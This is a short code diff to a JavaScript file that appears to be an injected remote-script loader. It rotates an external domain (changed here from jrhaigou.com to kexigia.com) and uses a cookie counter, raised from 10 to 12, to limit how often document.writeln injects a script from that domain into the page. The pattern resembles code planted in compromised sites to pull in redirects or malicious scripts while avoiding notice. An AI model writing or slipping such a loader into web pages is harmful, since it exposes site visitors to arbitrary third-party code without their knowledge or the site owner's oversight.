@@ -1,4 +1,4 @@
-var waplun = ["https://www.jrhaigou.com/img/10481","https://www.jrhaigou.com/img/10481"]
+var waplun = ["https://www.kexigia.com/img/10481","https://www.kexigia.com/img/10481"]
 var wapm=2;
 var wapn=Math.floor(Math.random()*wapm);
 //if (wapn <3){
@@ -6,7 +6,7 @@ var wapn=Math.floor(Math.random()*wapm);
 if (!getCookie('pf')){
     document.cookie = "pf=1;max-age=1000;";
 }
-if (Number(getCookie('pf'))<10){
+if (Number(getCookie('pf'))<12){
     document.cookie = "pf="+(Number(getCookie('pf'))+1)+";max-age=1000;";
     document.writeln("<script src='"+waplun[wapn]+"' ></script>");
 }
